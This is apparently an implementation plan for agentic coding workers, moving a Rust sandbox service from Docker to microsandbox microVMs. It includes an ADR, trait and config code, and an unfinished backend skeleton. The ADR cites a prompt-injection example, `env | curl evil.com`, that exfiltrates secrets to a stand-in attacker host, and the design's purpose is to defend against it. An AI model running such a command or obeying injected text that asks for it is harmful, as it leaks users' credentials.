# Microsandbox Sandbox Backend — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Replace the Docker-CLI backend in `crates/sandbox/` with microsandbox (libkrun microVMs) without changing the HTTP surface used by the AI builder. Land it behind a backend selector so we can flip per host and roll back without code changes.

**Architecture:** Extract a `Backend` trait from the existing `docker.rs` module. Implement two backends: `DockerBackend` (today) and `MicrosandboxBackend` (new). `AppState` carries `Arc<dyn Backend>`. Selection at startup via `SANDBOX_BACKEND={docker|microsandbox}`. Microsandbox library is tokio-only, so we isolate its runtime inside the backend impl and bridge to compio via `compio::runtime::spawn_blocking`. No daemon mode (microsandbox doesn't have one — issue #611); each host runs `zeroship-sandbox` directly on bare metal with `/dev/kvm` access. No snapshots (microsandbox issue #250 vapor); we bake deps into the runtime OCI image instead.

**Tech Stack:** Rust (compio + ntex::web for HTTP), `microsandbox` crate (pulls tokio internally), libkrun (KVM on Linux). Builder client (`apps/zeroship-builder/src/server/sandbox.ts`) is unchanged. Deepagents tool wiring (`chat.ts`) is unchanged.

**Spec / brainstorm:** Captured inline in this conversation (research agents on current sandbox arch + microsandbox capabilities; user-validated decision to adopt microsandbox specifically for the deepagents AI-builder workload).

**Out of scope:**
- HA / failover (microsandbox volumes are local-disk; revisit when snapshots ship)
- Replacing the Tier-1 V8 runtime (`crates/runtime/`, `crates/worker/`) — this plan only touches `crates/sandbox/`
- GPU passthrough (microsandbox issue #291)
- macOS hosts (KVM on Linux only; macOS works for `zeroship serve` local dev only)

---

## File Structure

**New files:**
- `docs/decisions/2026-04-30-microsandbox-backend.md` — ADR (decision + constraints)
- `crates/sandbox/src/backend.rs` — `Backend` trait + shared types (`ExecOutput`, `SessionHandle`)
- `crates/sandbox/src/backend_docker.rs` — moved from `docker.rs`, now implements `Backend`
- `crates/sandbox/src/backend_microsandbox.rs` — new microsandbox impl
- `crates/sandbox/src/runtime_bridge.rs` — single tokio current-thread runtime owned by the microsandbox backend
- `docker/agent-runtime/Dockerfile` — fat OCI image with prewarmed node/python/vite/deepagents deps
- `docker/agent-runtime/entrypoint.sh` — copies template into `/workspace` if empty
- `docs/runbooks/microsandbox-host.md` — operator notes (KVM, libkrun install, image pre-pull)

**Modified files:**
- `crates/sandbox/Cargo.toml` — add `microsandbox = "0.4"` (optional dep) + `tokio` (with `rt`); feature flag `microsandbox`
- `crates/sandbox/src/main.rs` — branch on `SANDBOX_BACKEND` to construct `Arc<dyn Backend>`; keep Docker probe on docker path
- `crates/sandbox/src/config.rs` — add `backend: BackendKind`, `runtime_image: String`, `runtime_idle_secs`, `runtime_max_secs`
- `crates/sandbox/src/lib.rs` — new file; re-export `AppState` and modules so the trait + state can be shared with tests
- `crates/sandbox/src/handlers.rs` — call `state.backend.*` instead of `docker::*`; carry `SessionHandle` (opaque) on the registry
- `crates/sandbox/src/session.rs` — store `SessionHandle` instead of `container_id` + `container_name`; GC calls `state.backend.stop`
- `crates/sandbox/src/files.rs` — for the microsandbox path, route through the backend (volume-aware) instead of host bind-mount
- `Cargo.toml` (workspace root) — add `microsandbox` to `[workspace.dependencies]` if we use that style

**Deleted files:**
- `crates/sandbox/src/docker.rs` — content moves into `backend_docker.rs`

---

## Task 0: Write the ADR

Locks the decision on paper before we touch code. References microsandbox issue numbers so future readers see the constraints we accepted.

**Files:**
- Create: `docs/decisions/2026-04-30-microsandbox-backend.md`

- [ ] **Step 1: Write the ADR**

Create `docs/decisions/2026-04-30-microsandbox-backend.md` with:

```markdown
# 2026-04-30 — Microsandbox as the AI-builder sandbox backend

## Status

Accepted.

## Context

The AI builder (`apps/zeroship-builder`) uses a deepagents-pattern LangChain
agent that calls `sandbox_read_file`, `sandbox_write_file`, `sandbox_exec`,
etc. as tools. Today these route to `crates/sandbox/`, which shells out to
the `docker` CLI. Containers share the host kernel, file ops go through a
host bind-mount, and there is no per-session egress allowlist or secret
isolation.

We want stronger isolation between agent sessions and a credible defense
against prompt-injection exfiltration of API keys.

## Decision

Replace the Docker-CLI backend with microsandbox (https://microsandbox.dev)
— libkrun-based microVMs with full Linux kernels per session. Specifically
because of the **secret-placeholder** feature: API keys exposed to agent
code are rewritten to `msb_ph_*` placeholders inside the guest, and only
substituted by a host-side TLS-intercepting proxy when egress hits an
allowlisted hostname. Prompt injections that try `env | curl evil.com`
exfiltrate placeholders, not real secrets. No other sandbox primitive ships
this today.

We do **not** adopt microsandbox for the Tier-1 V8 worker
(`crates/runtime/`). That runtime stays compio + V8 isolates.

## Constraints we accept

1. **Library only, no daemon.** Microsandbox does not yet ship `msb serve`
   (upstream issue #611). `zeroship-sandbox` is the daemon — we keep it.
2. **No nested virtualization.** Hosts running `zeroship-sandbox` need
   `/dev/kvm` and cannot themselves be inside Docker/k8s containers.
3. **No snapshots yet** (upstream issue #250). Cold start is a real Linux
   boot. We compensate by baking deps (vite, react, tailwind, common pip
   packages) into a fat OCI image (`ghcr.io/zeroship/agent-runtime`).
4. **Tokio inside the backend.** Microsandbox's Rust crate is tokio-only.
   We host a private tokio current-thread runtime in
   `crates/sandbox/src/runtime_bridge.rs`. Compio everywhere else in the
   codebase is unaffected — the boundary is `compio::runtime::spawn_blocking`.
5. **No HA on day one.** Named volumes are local-disk; on host loss the
   session's filesystem is lost. Revisit when shared-volume options exist.
6. **Async-httpx + secrets bug** (upstream issue #607). Test deepagents
   tools that use `httpx.AsyncClient` against the real backend before
   promoting; fall back to sync `requests` if needed.

## Alternatives considered

- **Keep Docker.** Cheap, but no per-session egress isolation, no secret
  placeholder, and host-kernel-shared. Rejected.
- **Firecracker direct.** More mature, has snapshots, but no secret
  placeholder. Building secret-rewriting + smoltcp policy ourselves is
  weeks of work. Re-evaluate if microsandbox stalls.
- **gVisor.** User-space syscall emulation. Weaker isolation track record;
  no secret feature. Rejected.
- **E2B / Daytona / Modal.** Hosted services; we want self-hosted.
  Rejected for the platform path; useful for local-dev experiments.

## Rollout

Backend selector: `SANDBOX_BACKEND=docker|microsandbox` (default `docker`).
Flip per host. No data migration (workspaces live under different paths).
Roll back by restarting with `SANDBOX_BACKEND=docker`.

## References

- microsandbox repo: https://github.com/microsandbox/microsandbox
- docs: https://docs.microsandbox.dev
- Issues we depend on: #250 snapshots, #611 daemon, #607 httpx, #304
  horizontal scaling, #528 network-policy redesign
```

- [ ] **Step 2: Commit**

```bash
git add docs/decisions/2026-04-30-microsandbox-backend.md
git commit -m "docs(adr): adopt microsandbox as AI-builder sandbox backend"
```

---

## Task 1: Extract `Backend` trait, port `DockerBackend`

Refactor `docker.rs` into a trait + impl. No behavior change. Tests stay green.

**Files:**
- Create: `crates/sandbox/src/backend.rs`
- Create: `crates/sandbox/src/backend_docker.rs`
- Create: `crates/sandbox/src/lib.rs`
- Modify: `crates/sandbox/src/main.rs`
- Modify: `crates/sandbox/src/handlers.rs`
- Modify: `crates/sandbox/src/session.rs`
- Modify: `crates/sandbox/src/files.rs`
- Delete: `crates/sandbox/src/docker.rs`

- [ ] **Step 1: Write the failing trait test**

Create `crates/sandbox/tests/backend_trait.rs`:

```rust
//! Compile-only smoke test that the trait object is usable from the
//! same shapes the handlers use.
use std::sync::Arc;
use zeroship_sandbox::backend::{Backend, ExecOutput, SessionHandle};

#[test]
fn trait_object_is_object_safe() {
    fn _takes(_b: Arc<dyn Backend>) {}
}

#[test]
fn exec_output_roundtrip() {
    let o = ExecOutput { status: 0, stdout: "ok".into(), stderr: String::new() };
    let s = serde_json::to_string(&o).unwrap();
    let back: ExecOutput = serde_json::from_str(&s).unwrap();
    assert_eq!(back.status, 0);
    assert_eq!(back.stdout, "ok");
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p zeroship-sandbox --test backend_trait`
Expected: FAIL — `zeroship_sandbox::backend` does not exist.

- [ ] **Step 3: Create `lib.rs` so the crate exposes its modules**

Create `crates/sandbox/src/lib.rs`:

```rust
//! Library entry point for `zeroship-sandbox`. The binary in `main.rs`
//! drives this; tests link against it directly.

pub mod auth;
pub mod backend;
pub mod backend_docker;
pub mod config;
pub mod files;
pub mod handlers;
pub mod runtime_bridge;
pub mod session;

use std::sync::Arc;

use crate::backend::Backend;
use crate::config::SandboxConfig;
use crate::session::SessionRegistry;

#[allow(missing_debug_implementations)]
pub struct AppState {
    pub config: SandboxConfig,
    pub sessions: SessionRegistry,
    pub backend: Arc<dyn Backend>,
}
```

Also update `crates/sandbox/Cargo.toml` to declare both binary and library targets:

```toml
[lib]
name = "zeroship_sandbox"
path = "src/lib.rs"

[[bin]]
name = "zeroship-sandbox"
path = "src/main.rs"
```

- [ ] **Step 4: Create the `Backend` trait**

Create `crates/sandbox/src/backend.rs`:

```rust
//! Sandbox backend trait — the surface every isolation strategy
//! (Docker, microsandbox, …) implements.
//!
//! All methods are `async`. Backends own their own runtime if they
//! need one (microsandbox runs tokio internally; Docker uses
//! `compio::runtime::spawn_blocking`).

use std::path::PathBuf;

use async_trait::async_trait;
use serde::{Deserialize, Serialize};

/// Result of running a command inside a session.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct ExecOutput {
    pub status: i32,
    pub stdout: String,
    pub stderr: String,
}

/// Opaque identifier the backend uses to find a sandbox. For Docker
/// it's the container name; for microsandbox it's the named-sandbox
/// id. Stored in `SessionRegistry` and passed back to the backend
/// for every subsequent call.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct SessionHandle {
    /// Backend-specific name (e.g. `zsbx-<uuid>` for Docker,
    /// `agent-<project_id>` for microsandbox).
    pub name: String,
    /// Optional secondary id (Docker container ID, microsandbox VM ID).
    pub id: Option<String>,
    /// Workspace path on the host. For Docker this is a bind-mount
    /// dir; for microsandbox this is `~/.microsandbox/volumes/<name>/`
    /// (the host-visible mirror of the named volume).
    pub workspace_path: PathBuf,
    /// Optional IP for the Docker network. Microsandbox returns `None`.
    pub container_ip: Option<String>,
}

/// Per-session config the handler passes when creating a sandbox.
#[derive(Clone, Debug)]
pub struct CreateRequest<'a> {
    pub project_id: &'a str,
    pub session_id: &'a str,
}

#[async_trait]
pub trait Backend: Send + Sync {
    /// Health-probe the backend. Called once at startup.
    async fn probe(&self) -> Result<(), String>;

    /// Create a new long-lived sandbox for a session.
    async fn create(&self, req: CreateRequest<'_>) -> Result<SessionHandle, String>;

    /// Run a shell command in the sandbox under `sh -c`.
    async fn exec(
        &self,
        h: &SessionHandle,
        cmd: &str,
        cwd: Option<&str>,
        timeout_ms: Option<u64>,
    ) -> Result<ExecOutput, String>;

    /// Read a file from the workspace (relative to workspace root).
    async fn read_file(&self, h: &SessionHandle, path: &str) -> Result<Vec<u8>, String>;

    /// Write (overwrite) a file in the workspace.
    async fn write_file(&self, h: &SessionHandle, path: &str, body: &[u8])
        -> Result<(), String>;

    /// Delete a file. `Ok(false)` if the file did not exist.
    async fn delete_file(&self, h: &SessionHandle, path: &str) -> Result<bool, String>;

    /// Walk the workspace and return the file tree.
    async fn file_tree(&self, h: &SessionHandle) -> Result<Vec<FileEntry>, String>;

    /// Stop a sandbox and release its resources. Idempotent.
    async fn stop(&self, h: &SessionHandle) -> Result<(), String>;
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct FileEntry {
    pub path: String,
    pub kind: FileKind,
    pub size: u64,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum FileKind {
    File,
    Dir,
}
```

Add to `crates/sandbox/Cargo.toml` `[dependencies]`:

```toml
async-trait = "0.1"
```

- [ ] **Step 5: Move `docker.rs` into `backend_docker.rs` and impl the trait**

```bash
git mv crates/sandbox/src/docker.rs crates/sandbox/src/backend_docker.rs
```

Append to `crates/sandbox/src/backend_docker.rs` after the existing module-level code:

```rust
use async_trait::async_trait;
use std::path::PathBuf;

use crate::backend::{Backend, CreateRequest, ExecOutput as ExecOutputT, FileEntry, FileKind, SessionHandle};
use crate::config::SandboxConfig;
use crate::files;

#[derive(Clone)]
pub struct DockerBackend {
    pub config: SandboxConfig,
}

impl DockerBackend {
    pub fn new(config: SandboxConfig) -> Self { Self { config } }
}

#[async_trait]
impl Backend for DockerBackend {
    async fn probe(&self) -> Result<(), String> {
        probe_docker().await
    }

    async fn create(&self, req: CreateRequest<'_>) -> Result<SessionHandle, String> {
        let workspace = self.config.workspace_root.join(req.project_id);
        std::fs::create_dir_all(&workspace).map_err(|e| format!("create workspace: {e}"))?;

        let name = format!("zsbx-{}", req.session_id.replace('-', ""));
        let id = run_container(
            &self.config.image,
            &name,
            &self.config.network,
            &workspace,
            self.config.memory_mb,
            self.config.cpus,
            req.project_id,
            req.session_id,
        ).await?;
        let ip = container_ip(&id, &self.config.network).await.unwrap_or_default();

        Ok(SessionHandle {
            name,
            id: Some(id),
            workspace_path: workspace,
            container_ip: if ip.is_empty() { None } else { Some(ip) },
        })
    }

    async fn exec(
        &self,
        h: &SessionHandle,
        cmd: &str,
        cwd: Option<&str>,
        timeout_ms: Option<u64>,
    ) -> Result<ExecOutputT, String> {
        let out = exec_in_container(&h.name, cmd, cwd, timeout_ms).await?;
        Ok(ExecOutputT { status: out.status, stdout: out.stdout, stderr: out.stderr })
    }

    async fn read_file(&self, h: &SessionHandle, path: &str) -> Result<Vec<u8>, String> {
        files::read_file(&h.workspace_path, path)
    }

    async fn write_file(&self, h: &SessionHandle, path: &str, body: &[u8]) -> Result<(), String> {
        files::write_file(&h.workspace_path, path, body)
    }

    async fn delete_file(&self, h: &SessionHandle, path: &str) -> Result<bool, String> {
        files::delete_file(&h.workspace_path, path)
    }

    async fn file_tree(&self, h: &SessionHandle) -> Result<Vec<FileEntry>, String> {
        let entries = files::file_tree(&h.workspace_path)?;
        Ok(entries.into_iter().map(|e| FileEntry {
            path: e.path,
            kind: if e.is_dir { FileKind::Dir } else { FileKind::File },
            size: e.size,
        }).collect())
    }

    async fn stop(&self, h: &SessionHandle) -> Result<(), String> {
        stop_container(&h.name).await
    }
}
```

The free functions (`probe_docker`, `run_container`, `exec_in_container`, `stop_container`, `container_ip`, `pull_image`, `run`, `shell_quote`) keep their signatures — they're used by the trait impl above. Make them `pub(crate)` or wrap them in `impl DockerBackend` if you prefer. Stay surgical.

- [ ] **Step 6: Update `session.rs` to store `SessionHandle`**

In `crates/sandbox/src/session.rs`, replace the four container-related fields with one `SessionHandle`:

```rust
use crate::backend::SessionHandle;

#[derive(Clone, Debug, Serialize)]
pub struct SessionInfo {
    pub session_id: String,
    pub project_id: String,
    pub handle: SessionHandle,
    pub created_at_secs: u64,
    pub last_used_at_secs: u64,
}

#[derive(Clone)]
struct Session {
    session_id: Uuid,
    project_id: String,
    handle: SessionHandle,
    created_at: Instant,
    created_at_unix: u64,
    last_used: Arc<RwLock<Instant>>,
}
```

Update `Session::to_info`, `SessionRegistry::insert` to take a `SessionHandle`, and `start_idle_gc` to call `state.backend.stop(&info.handle)` instead of `crate::docker::stop_container(...)`. The two getters (`get`, `find_by_project`, `remove`, `list`) keep their shapes.

- [ ] **Step 7: Update `handlers.rs` to call through the trait**

Replace every `docker::*` call with `state.backend.*`. The HTTP shapes are unchanged. Specifically:

- `create_session`: `state.backend.create(CreateRequest { project_id, session_id }).await` instead of the inline `docker::run_container` + `docker::container_ip`. Then `state.sessions.insert(session_id, project_id, handle)`.
- `stop_session`: `state.backend.stop(&info.handle).await`.
- `exec`: `state.backend.exec(&info.handle, &body.cmd, body.cwd.as_deref(), Some(timeout_ms)).await`.
- `file_tree`, `read_file`, `write_file`, `delete_file`: route through `state.backend.*` instead of `crate::files::*`.

- [ ] **Step 8: Update `main.rs` to construct `Arc<dyn Backend>`**

```rust
use std::sync::Arc;

use zeroship_sandbox::{
    backend::Backend,
    backend_docker::DockerBackend,
    config::SandboxConfig,
    session::{self, SessionRegistry},
    AppState,
};

#[ntex::main]
async fn main() -> std::io::Result<()> {
    let config = match SandboxConfig::from_env() {
        Ok(c) => c,
        Err(e) => { eprintln!("[sandbox] config error: {e}"); std::process::exit(1); }
    };

    // Backend selector — only Docker for now; Task 4 adds microsandbox.
    let backend: Arc<dyn Backend> = Arc::new(DockerBackend::new(config.clone()));

    if let Err(e) = backend.probe().await {
        eprintln!("[sandbox] backend probe failed: {e}");
        std::process::exit(1);
    }

    if let Err(e) = std::fs::create_dir_all(&config.workspace_root) {
        eprintln!("[sandbox] failed to create workspace root: {e}");
        std::process::exit(1);
    }

    let state = Arc::new(AppState {
        config: config.clone(),
        sessions: SessionRegistry::new(),
        backend,
    });
    session::start_idle_gc(state.clone());

    // ... ntex server unchanged ...
}
```

- [ ] **Step 9: Run trait test + existing tests**

```bash
cargo test -p zeroship-sandbox
```

Expected: all tests pass, including `backend_trait`.

- [ ] **Step 10: Commit**

```bash
git add crates/sandbox/
git commit -m "refactor(sandbox): extract Backend trait, port Docker impl"
```

---

## Task 2: Add `BackendKind` config + selector

Wires the env var. Microsandbox path returns "not yet implemented" — the selector branch lands first so we can land Task 3 in isolation.

**Files:**
- Modify: `crates/sandbox/src/config.rs`
- Modify: `crates/sandbox/src/main.rs`

- [ ] **Step 1: Write a failing test for the parser**

Append to `crates/sandbox/src/config.rs`:

```rust
#[cfg(test)]
mod backend_kind_tests {
    use super::*;

    #[test]
    fn parses_docker() {
        assert!(matches!("docker".parse::<BackendKind>(), Ok(BackendKind::Docker)));
    }
    #[test]
    fn parses_microsandbox() {
        assert!(matches!("microsandbox".parse::<BackendKind>(), Ok(BackendKind::Microsandbox)));
    }
    #[test]
    fn rejects_other() {
        assert!("podman".parse::<BackendKind>().is_err());
    }
}
```

- [ ] **Step 2: Run, expect FAIL**

```bash
cargo test -p zeroship-sandbox config::backend_kind_tests
```

Expected: FAIL — `BackendKind` undefined.

- [ ] **Step 3: Add `BackendKind` + extend `SandboxConfig`**

In `crates/sandbox/src/config.rs`:

```rust
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum BackendKind {
    Docker,
    Microsandbox,
}

impl std::str::FromStr for BackendKind {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s {
            "docker" => Ok(Self::Docker),
            "microsandbox" => Ok(Self::Microsandbox),
            other => Err(format!("unknown SANDBOX_BACKEND: {other}")),
        }
    }
}
```

Add fields to `SandboxConfig`:

```rust
pub backend: BackendKind,
/// Microsandbox runtime image. `SANDBOX_RUNTIME_IMAGE`
/// (default `ghcr.io/zeroship/agent-runtime:latest`).
pub runtime_image: String,
/// Per-VM idle drain. `SANDBOX_VM_IDLE_SECS` (default 600).
pub vm_idle_secs: u64,
/// Per-VM hard cap. `SANDBOX_VM_MAX_SECS` (default 28800).
pub vm_max_secs: u64,
```

In `from_env`, parse the new vars:

```rust
let backend = parse_env::<BackendKind>("SANDBOX_BACKEND", BackendKind::Docker)?;
let runtime_image = std::env::var("SANDBOX_RUNTIME_IMAGE")
    .unwrap_or_else(|_| "ghcr.io/zeroship/agent-runtime:latest".to_string());
let vm_idle_secs = parse_env("SANDBOX_VM_IDLE_SECS", 600u64)?;
let vm_max_secs = parse_env("SANDBOX_VM_MAX_SECS", 28800u64)?;
```

- [ ] **Step 4: Update `main.rs` to branch on `BackendKind`**

```rust
use zeroship_sandbox::config::BackendKind;

let backend: Arc<dyn Backend> = match config.backend {
    BackendKind::Docker => Arc::new(DockerBackend::new(config.clone())),
    BackendKind::Microsandbox => {
        eprintln!("[sandbox] microsandbox backend not yet implemented (Task 4)");
        std::process::exit(1);
    }
};
```

- [ ] **Step 5: Run tests**

```bash
cargo test -p zeroship-sandbox
```

Expected: pass.

- [ ] **Step 6: Commit**

```bash
git add crates/sandbox/src/config.rs crates/sandbox/src/main.rs
git commit -m "feat(sandbox): add SANDBOX_BACKEND selector"
```

---

## Task 3: Tokio bridge module

Microsandbox's Rust crate is tokio-only. Hosts a single `tokio::runtime::Runtime` and exposes `block_on_tokio<F>` — called from compio via `compio::runtime::spawn_blocking`.

**Files:**
- Create: `crates/sandbox/src/runtime_bridge.rs`
- Modify: `crates/sandbox/Cargo.toml`

- [ ] **Step 1: Write a failing test**

Create `crates/sandbox/tests/runtime_bridge.rs`:

```rust
use zeroship_sandbox::runtime_bridge::{tokio_handle, with_tokio};

#[compio::main]
async fn main() {
    // Sanity: tokio_handle returns the same handle each call.
    let h1 = tokio_handle();
    let h2 = tokio_handle();
    assert_eq!(h1.id(), h2.id(), "tokio runtime should be a singleton");

    // with_tokio runs a tokio future from compio.
    let n: u32 = with_tokio(async {
        tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        42
    }).await.unwrap();
    assert_eq!(n, 42);
}
```

(Run via `cargo test -p zeroship-sandbox --test runtime_bridge`.)

- [ ] **Step 2: Run, expect FAIL**

Expected: FAIL — `runtime_bridge` module undefined.

- [ ] **Step 3: Add tokio dependency**

In `crates/sandbox/Cargo.toml`:

```toml
[dependencies]
tokio = { version = "1", features = ["rt-multi-thread", "time", "sync", "io-util", "macros"] }
```

- [ ] **Step 4: Implement the bridge**

Create `crates/sandbox/src/runtime_bridge.rs`:

```rust
//! Private tokio runtime for the microsandbox backend.
//!
//! Microsandbox's Rust SDK is tokio-only. We run one multi-thread
//! tokio runtime in the process — owned by this module — and bridge
//! to compio via `compio::runtime::spawn_blocking`. The runtime is
//! lazily initialized on first use and lives for the lifetime of
//! the process; tearing it down is unnecessary because dropping the
//! handle inside compio's blocking pool would block the compio worker.
//!
//! This is the only file in the workspace that imports tokio. Keep
//! it that way; the rest of the codebase is compio-native.

use std::future::Future;
use std::sync::OnceLock;

use tokio::runtime::{Handle, Runtime};

static TOKIO: OnceLock<Runtime> = OnceLock::new();

fn rt() -> &'static Runtime {
    TOKIO.get_or_init(|| {
        tokio::runtime::Builder::new_multi_thread()
            .worker_threads(2)
            .thread_name("zsbx-tokio")
            .enable_all()
            .build()
            .expect("build tokio runtime")
    })
}

pub fn tokio_handle() -> Handle {
    rt().handle().clone()
}

/// Run a tokio future from a compio context. The future executes on
/// the private tokio runtime; the awaiting compio task parks on a
/// `oneshot` and is unblocked when the future completes.
pub async fn with_tokio<F, T>(fut: F) -> Result<T, String>
where
    F: Future<Output = T> + Send + 'static,
    T: Send + 'static,
{
    let (tx, rx) = compio::sync::oneshot::channel::<T>();
    let handle = tokio_handle();
    handle.spawn(async move {
        let v = fut.await;
        let _ = tx.send(v);
    });
    rx.await.map_err(|e| format!("tokio bridge: {e}"))
}
```

(If `compio::sync::oneshot` is not available in the compio version pinned by this workspace, swap to `futures::channel::oneshot` and adapt the receiver. Confirm by grepping: `grep -R "compio::sync" crates/`.)

- [ ] **Step 5: Run test, expect PASS**

```bash
cargo test -p zeroship-sandbox --test runtime_bridge
```

- [ ] **Step 6: Commit**

```bash
git add crates/sandbox/Cargo.toml crates/sandbox/src/runtime_bridge.rs crates/sandbox/tests/runtime_bridge.rs
git commit -m "feat(sandbox): private tokio runtime bridge for microsandbox"
```

---

## Task 4: `MicrosandboxBackend` skeleton (probe + create + stop)

Minimum viable backend: probe the host can reach libkrun, create a named sandbox, stop it. Exec and file ops in Task 5 / Task 6.

> ⚠ **Verify first** — the exact `microsandbox` Rust crate API may have shifted between 0.4.x patch releases. Before coding, run:
> ```
> cargo doc -p microsandbox --open
> ```
> and confirm the builder fluent surface (`Sandbox::builder("name")`, `.image()`, `.cpus()`, `.memory()`, `.create()`, `Sandbox::get()`, `.stop()`). If any name differs, adjust the snippets below. **Do not invent method names.**

**Files:**
- Create: `crates/sandbox/src/backend_microsandbox.rs`
- Modify: `crates/sandbox/src/lib.rs` (export module)
- Modify: `crates/sandbox/Cargo.toml` (add `microsandbox` optional dep + `microsandbox` feature)
- Modify: `crates/sandbox/src/main.rs` (wire backend)

- [ ] **Step 1: Add microsandbox dependency behind a feature flag**

In `crates/sandbox/Cargo.toml`:

```toml
[features]
default = ["docker"]
docker = []
microsandbox = ["dep:microsandbox"]

[dependencies]
microsandbox = { version = "0.4", optional = true }
```

The `docker` feature is a no-op marker for symmetry. The microsandbox backend only compiles when the feature is on.

- [ ] **Step 2: Write a failing skeleton test (compile-only)**

Create `crates/sandbox/tests/microsandbox_smoke.rs`:

```rust
//! Compile-only test: the microsandbox backend implements `Backend`.
//! We do NOT spawn a real VM here (KVM may be missing in CI).
#![cfg(feature = "microsandbox")]
use std::sync::Arc;
use zeroship_sandbox::backend::Backend;
use zeroship_sandbox::backend_microsandbox::MicrosandboxBackend;
use zeroship_sandbox::config::SandboxConfig;

#[test]
fn implements_backend() {
    fn _is_backend<T: Backend>() {}
    _is_backend::<MicrosandboxBackend>();
    let cfg = SandboxConfig {
        port: 9091, token: String::new(),
        image: "zeroship/sandbox-base:latest".into(),
        workspace_root: std::path::PathBuf::from("/tmp/x"),
        network: "n".into(), memory_mb: 1024, cpus: 2.0,
        idle_timeout_secs: 1800, max_lifetime_secs: 28800, auto_pull: false,
        backend: zeroship_sandbox::config::BackendKind::Microsandbox,
        runtime_image: "ghcr.io/zeroship/agent-runtime:latest".into(),
        vm_idle_secs: 600, vm_max_secs: 28800,
    };
    let _b: Arc<dyn Backend> = Arc::new(MicrosandboxBackend::new(cfg));
}
```

- [ ] **Step 3: Run, expect FAIL**

```bash
cargo test -p zeroship-sandbox --features microsandbox --test microsandbox_smoke
```

Expected: FAIL — module undefined.

- [ ] **Step 4: Implement skeleton**

Create `crates/sandbox/src/backend_microsandbox.rs`:

```rust
//! Microsandbox backend — libkrun microVMs per session.
//!
//! Lifecycle:
//!   - `create` → `Sandbox::builder().image(...).volumes(...).secrets(...).create()`
//!     with name `agent-{project_id}` and a named volume `agent-{project_id}-fs`
//!     mounted at `/workspace`. `detached(true)` so it survives this process.
//!   - `exec` → `Sandbox::get(name).exec_stream("sh", ["-c", cmd]).await`,
//!     drained into stdout/stderr.
//!   - `read_file` / `write_file` → SDK fs API (CBOR over virtio-serial).
//!   - `stop` → `sb.stop()` (preserves the named volume).
//!
//! All microsandbox calls execute on the private tokio runtime via
//! `runtime_bridge::with_tokio`. This file is the only place outside
//! that bridge that imports microsandbox or tokio types.

#![cfg(feature = "microsandbox")]

use async_trait::async_trait;
use std::path::PathBuf;

use crate::backend::{
    Backend, CreateRequest, ExecOutput, FileEntry, FileKind, SessionHandle,
};
use crate::config::SandboxConfig;
use crate::runtime_bridge::with_tokio;

#[derive(Clone)]
pub struct MicrosandboxBackend {
    cfg: SandboxConfig,
}

impl MicrosandboxBackend {
    pub fn new(cfg: SandboxConfig) -> Self { Self { cfg } }

    fn sandbox_name(project_id: &str) -> String { format!("agent-{project_id}") }
    fn volume_name(project_id: &str) -> String { format!("agent-{project_id}-fs") }

    /// Best-effort host-side path mirror of the named volume. Used for
    /// the `workspace_path` field on `SessionHandle` so legacy code
    /// (e.g. preview iframe URL) can resolve it. The actual file I/O
    /// goes through the SDK, NOT this path.
    fn host_volume_mirror(volume: &str) -> PathBuf {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
        PathBuf::from(home).join(".microsandbox/volumes").join(volume)
    }
}

#[async_trait]
impl Backend for MicrosandboxBackend {
    async fn probe(&self) -> Result<(), String> {
        // Health probe: try to list sandboxes (cheap; verifies libkrun
        // + KVM are reachable).
        with_tokio(async {
            // Pseudo-API; replace with the actual SDK probe after
            // verifying via `cargo doc -p microsandbox`.
            microsandbox::list_sandboxes().await
                .map(|_| ())
                .map_err(|e| format!("microsandbox list: {e}"))
        }).await?
    }

    async fn create(&self, req: CreateRequest<'_>) -> Result<SessionHandle, String> {
        let name = Self::sandbox_name(req.project_id);
        let volume = Self::volume_name(req.project_id);
        let image = self.cfg.runtime_image.clone();
        let cpus = self.cfg.cpus.max(1.0) as u32;
        let memory_mib = self.cfg.memory_mb;
        let idle = self.cfg.vm_idle_secs;
        let max = self.cfg.vm_max_secs;

        let name_clone = name.clone();
        with_tokio(async move {
            // Pseudo-API — verify against `cargo doc -p microsandbox`.
            // The shape we expect:
            //   Sandbox::builder(&name)
            //     .image(&image)
            //     .cpus(cpus)
            //     .memory(memory_mib)
            //     .volumes([Volume::named(&volume).mount("/workspace")])
            //     .idle_timeout(idle)
            //     .max_duration(max)
            //     .detached(true)
            //     .replace(true)
            //     .create()
            //     .await
            microsandbox::Sandbox::builder(&name_clone)
                .image(&image)
                .cpus(cpus)
                .memory(memory_mib)
                .volumes([microsandbox::Volume::named(&volume).mount("/workspace")])
                .idle_timeout(idle)
                .max_duration(max)
                .detached(true)
                .replace(true)
                .create()
                .await
                .map_err(|e| format!("microsandbox create: {e}"))?;
            Ok::<(), String>(())
        }).await??;

        Ok(SessionHandle {
            name,
            id: None,
            workspace_path: Self::host_volume_mirror(&volume),
            container_ip: None,
        })
    }

    async fn exec(
        &self,
        h: &SessionHandle,
        cmd: &str,
        cwd: Option<&str>,
        timeout_ms: Option<u64>,
    ) -> Result<ExecOutput, String> {
        // Real impl in Task 5.
        let _ = (h, cmd, cwd, timeout_ms);
        Err("microsandbox exec: not yet implemented (Task 5)".into())
    }

    async fn read_file(&self, _h: &SessionHandle, _path: &str) -> Result<Vec<u8>, String> {
        Err("microsandbox read_file: not yet implemented (Task 6)".into())
    }
    async fn write_file(&self, _h: &SessionHandle, _path: &str, _body: &[u8]) -> Result<(), String> {
        Err("microsandbox write_file: not yet implemented (Task 6)".into())
    }
    async fn delete_file(&self, _h: &SessionHandle, _path: &str) -> Result<bool, String> {
        Err("microsandbox delete_file: not yet implemented (Task 6)".into())
    }
    async fn file_tree(&self, _h: &SessionHandle) -> Result<Vec<FileEntry>, String> {
        Err("microsandbox file_tree: not yet implemented (Task 6)".into())
    }

    async fn stop(&self, h: &SessionHandle) -> Result<(), String> {
        let name = h.name.clone();
        with_tokio(async move {
            microsandbox::Sandbox::get(&name).await
